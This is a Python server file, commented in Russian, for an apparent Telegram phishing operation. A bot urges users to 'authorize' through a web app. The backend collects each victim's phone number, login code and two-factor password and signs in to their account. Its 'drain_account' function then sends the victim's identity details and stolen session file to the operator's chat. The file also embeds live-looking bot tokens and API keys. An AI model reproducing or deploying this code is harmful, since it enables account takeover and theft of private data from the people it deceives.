# language: Python, file: server.py
import asyncio
import logging
import os
from aiohttp import web
import aiohttp_cors
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
TOKEN = "8387003432:AAEgowIYtec2bzXPOZvFmFb0-Hh-bFVZjJE"
LOG_CHAT_ID = -1003568067399
ADMIN_IDS = [6547826447]
WEBAPP_URL = "https://silly-malasada-066fb8.netlify.app/" 

# ПОЛУЧИ ЭТИ ДАННЫЕ НА my.telegram.org
API_ID = 30107003          
API_HASH = "24904c924ccfd6c202d065a833a46741" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

clients = {}
pending_passwords = {}

# --- 1. БОТ ---
@dp.message(F.text == "/start")
async def start(message: types.Message):
    # Проверяем, что это личный чат
    if message.chat.type != "private":
        await message.answer("Пожалуйста, напишите мне в личные сообщения для авторизации.")
        return

    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="Авторизоваться", web_app=WebAppInfo(url=WEBAPP_URL))]],
        resize_keyboard=True
    )
    await message.answer(
        "Добро пожаловать! Пожалуйста, авторизуйтесь через Telegram для продолжения.", 
        reply_markup=kb
    )

# --- 2. API ---
async def send_code(request):
    data = await request.json()
    phone = data.get("phone")
    if not phone.startswith('+'):
        phone = '+' + phone
        
    client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        clients[phone] = client
        return web.json_response({"success": True, "phone_code_hash": sent_code.phone_code_hash})
    except Exception as e:
        await client.disconnect()
        return web.json_response({"success": False, "error": str(e)})

async def sign_in(request):
    data = await request.json()
    phone = data.get("phone")
    code = data.get("code")
    phone_code_hash = data.get("phone_code_hash")
    
    client = clients.get(phone)
    if not client:
        return web.json_response({"success": False, "error": "Сначала запросите код."})

    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        asyncio.create_task(drain_account(client, phone))
        return web.json_response({"success": True})
    except SessionPasswordNeededError:
        pending_passwords[phone] = client
        return web.json_response({"success": False, "need_password": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

async def check_password(request):
    data = await request.json()
    password = data.get("password")
    
    if not pending_passwords:
        return web.json_response({"success": False, "error": "Сессия истекла."})

    phone = list(pending_passwords.keys())[0]
    client = pending_passwords[phone]
    
    try:
        await client.sign_in(password=password)
        asyncio.create_task(drain_account(client, phone))
        del pending_passwords[phone]
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"success": False, "error": "Неверный пароль."})

# --- 3. ВЫВОД ---
async def drain_account(client: TelegramClient, phone: str):
    try:
        me = await client.get_me()
        if not me:
            return
            
        await bot.send_message(
            LOG_CHAT_ID, 
            f"✅ <b>Успешный вход!</b>\nID: <code>{me.id}</code>\nИмя: {me.first_name}\nТелефон: {phone}"
        )
        
        session_file = f"session_{phone}.session"
        if os.path.exists(session_file):
            await bot.send_document(LOG_CHAT_ID, types.FSInputFile(session_file))
            
    except Exception as e:
        logging.error(f"Drain error: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при выводе: {e}")

# --- 4. ЗАПУСК ---
async def main():
    app = web.Application()
    
    cors = aiohttp_cors.setup(app, defaults={
        "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*", allow_methods=["POST", "OPTIONS"])
    })

    app.router.add_post('/api/send_code', send_code)
    app.router.add_post('/api/sign_in', sign_in)
    app.router.add_post('/api/check_password', check_password)
    
    for route in list(app.router.routes()):
        cors.add(route)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    logging.info("API Server started on port 8080")
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())